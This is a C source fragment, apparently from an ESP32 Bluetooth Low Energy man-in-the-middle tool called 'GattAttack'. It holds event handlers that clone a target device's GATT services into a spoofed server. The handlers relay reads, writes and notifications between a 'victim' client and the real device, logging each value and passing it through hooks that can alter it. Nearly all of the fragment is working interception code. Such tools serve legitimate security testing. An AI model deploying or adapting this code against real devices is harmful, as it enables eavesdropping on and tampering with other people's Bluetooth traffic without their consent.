// Included in GattAttack.c to share callback state within one C translation unit.
  case ESP_GATTC_SEARCH_CMPL_EVT: {
    /**
     * This event after we have cloned
     * all the services and are ready
     * to intialized our spoofed GATT
     * Server using these clones.
     *
     * This starts the GATT Server
     */
    if (param->search_cmpl.status != ESP_GATT_OK) {
      ESP_LOGE(TAG, "search service failed, error status = %x", param->search_cmpl.status);
      break;
    }

    if (clone_init) {
      break;
    }

    clone_init = true;
    clone.target_client_conn_id = param->search_cmpl.conn_id;

    esp_err_t ret = esp_ble_gatts_register_callback(server_event);
    if (ret) {
      ESP_LOGE(TAG, "gatts register error, error code = %x", ret);
      return;
    }

    ret = esp_ble_gatts_app_register(0);
    if (ret) {
      ESP_LOGE(TAG, "gatts app register error, error code = %x", ret);
      return;
    }

    gatt_send_output("GATT Server starting", false);
    break;
  }
  case ESP_GATTC_REG_FOR_NOTIFY_EVT: {
    /**
     * This event comes after a victim
     * client has wrote a descriptor
     * to turn on notifications for a
     * handle and we set our attacking
     * client to notify on the same
     * handle.
     */
    if (param->reg_for_notify.status != ESP_GATT_OK) {
      ESP_LOGE(TAG, "REG FOR NOTIFY failed: error status = %d", param->reg_for_notify.status);
      break;
    }

    gatt_send_output("Client register notify success", false);
    // Local notification registration is not completion of the remote
    // CCCD write; its response arrives in ESP_GATTC_WRITE_DESCR_EVT.
    break;
  }
  case ESP_GATTC_NOTIFY_EVT: {
    /**
     * This event comes when our
     * attacking client has received
     * a notify event.
     *
     * Here we run hooks if needed,
     * log the information and pass
     * it back to our victim.
     */
    char uuid[38] = {0};
    uint16_t notify_len = param->notify.value_len;
    if (notify_len > ESP_GATT_MAX_ATTR_LEN)
      break;
    uint8_t *notify_value = (uint8_t *)malloc(notify_len ? notify_len : 1);
    if (!notify_value)
      break;
    if (notify_len)
      memcpy(notify_value, param->notify.value, notify_len);

    char *hex_value = bytes_to_hex_string(param->notify.value, param->notify.value_len);
    get_uuid_for_handle(param->notify.handle, uuid);

    apply_hook("read", uuid, &hex_value, &notify_value, &notify_len);

    log_and_send_json(param->notify.is_notify ? "NOTIFY" : "INDICATE", "target -> victim", "",
                      gattc_if, param->notify.conn_id, 0, param->notify.handle, 0, uuid,
                      hex_value ? hex_value : "");

    free(hex_value);

    esp_ble_gatts_send_indicate(clone.gatts_if, clone.victim_client_conn_id, param->notify.handle,
                                notify_len, notify_value, !param->notify.is_notify);
    free(notify_value);
    break;
  }
  case ESP_GATTC_WRITE_DESCR_EVT: {
    /**
     * Event called after our attacking
     * client has written to a descriptor.
     */
    char uuid[38] = {0};
    get_uuid_for_handle(param->write.handle, uuid);

    if (param->write.status != ESP_GATT_OK) {
      ESP_LOGE(TAG, "write descr failed, error status = %x", param->write.status);
    }

    if (pending_write.active && pending_write.descriptor == true &&
        pending_write.handle == param->write.handle &&
        param->write.conn_id == clone.target_client_conn_id) {
      finish_pending_write(param->write.status);
    }
    break;
  }
  case ESP_GATTC_WRITE_CHAR_EVT: {
    /**
     * This event comes after our
     * attacking client has written
     * to the target device. We can
     * determine if it was successfull
     * or not.
     *
     * If victim needed a response to the
     * last write we send it to them.
     */
    char uuid[38] = {0};
    get_uuid_for_handle(param->write.handle, uuid);

    if (param->write.status != ESP_GATT_OK) {
      ESP_LOGE(TAG, "write char failed, error status = %x", param->write.status);
    }

    if (pending_write.active && pending_write.descriptor == false &&
        pending_write.handle == param->write.handle &&
        param->write.conn_id == clone.target_client_conn_id) {
      finish_pending_write(param->write.status);
    }
    break;
  }
  case ESP_GATTC_PREP_WRITE_EVT: {
    /**
     * This event comes after the
     * attacking client has sent
     * a prep write to either a
     * char or desc.
     */
    char uuid[38] = {0};
    get_uuid_for_handle(param->write.handle, uuid);
    log_and_send_json("PREP WRITE RSP", "target -> victim", "", gattc_if, clone.server_conn_id, 0,
                      param->write.handle, param->write.status, uuid, NULL);
    break;
  }
  case ESP_GATTC_EXEC_EVT: {
    /**
     * Comes after our attacking
     * client has completed its
     * exec event on the target
     * device.
     */
    log_and_send_json("EXEC RSP", "target -> victim", NULL, gattc_if, param->exec_cmpl.conn_id,
                      clone.server_trans_id, 0, param->exec_cmpl.status, NULL, NULL);

    break;
  }
  case ESP_GATTC_READ_CHAR_EVT: {
    /**
     * Event comes after our attacking
     * client has received data from
     * a read event.
     *
     * Here we run hooks if needed,
     * log this event and send
     * it back on to the victim.
     */
    char uuid[38] = {0};
    uint16_t read_len = param->read.value_len;
    if (read_len > ESP_GATT_MAX_ATTR_LEN)
      break;
    uint8_t *read_value = (uint8_t *)malloc(read_len ? read_len : 1);
    if (!read_value)
      break;
    if (read_len)
      memcpy(read_value, param->read.value, read_len);
    char *hex_value = bytes_to_hex_string(param->read.value, param->read.value_len);
    get_uuid_for_handle(param->read.handle, uuid);

    apply_hook("read", uuid, &hex_value, &read_value, &read_len);

    log_and_send_json("READ CHAR RSP", "target -> victim", "", gattc_if, param->read.conn_id,
                      clone.server_trans_id, param->read.handle, param->read.status, uuid,
                      hex_value);

    free(hex_value);

    esp_gatt_rsp_t rsp;
    memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
    rsp.attr_value.handle = param->read.handle;
    rsp.attr_value.len = read_len;
    memcpy(rsp.attr_value.value, read_value, read_len);
    free(read_value);
    esp_ble_gatts_send_response(clone.gatts_if, clone.server_conn_id, clone.server_trans_id,
                                ESP_GATT_OK, &rsp);
    break;
  }
  case ESP_GATTC_READ_DESCR_EVT: {
    /**
     * Event comes when a descriptor
     * is read.
     *
     * We need to send resp back to
     * victim.
     */
    char uuid[38] = {0};
    uint16_t read_len = param->read.value_len;
    if (read_len > ESP_GATT_MAX_ATTR_LEN)
      break;
    uint8_t *read_value = (uint8_t *)malloc(read_len ? read_len : 1);
    if (!read_value)
      break;
    if (read_len)
      memcpy(read_value, param->read.value, read_len);
    char *hex_value = bytes_to_hex_string(param->read.value, param->read.value_len);
    get_uuid_for_handle(param->read.handle, uuid);

    apply_hook("read", uuid, &hex_value, &read_value, &read_len);

    log_and_send_json("READ DESC RSP", "target -> victim", "", gattc_if, param->read.conn_id,
                      clone.server_trans_id, param->read.handle, param->read.status, uuid,
                      hex_value);

    free(hex_value);

    esp_gatt_rsp_t rsp;
    memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
    rsp.attr_value.handle = param->read.handle;
    rsp.attr_value.len = read_len;
    memcpy(rsp.attr_value.value, read_value, read_len);
    free(read_value);
    esp_ble_gatts_send_response(clone.gatts_if, clone.server_conn_id, clone.server_trans_id,
                                ESP_GATT_OK, &rsp);
    break;
  }
  case ESP_GATTC_SRVC_CHG_EVT: {
    /**
     * This event comes when the
     * remote target device has
     * changed its BDA (Mac) addres.
     */
    esp_bd_addr_t bda;
    memcpy(bda, param->srvc_chg.remote_bda, sizeof(esp_bd_addr_t));
    ESP_LOGI(TAG, "ESP_GATTC_SRVC_CHG_EVT, bd_addr:");
    esp_log_buffer_hex(TAG, bda, sizeof(esp_bd_addr_t));
    break;
  }
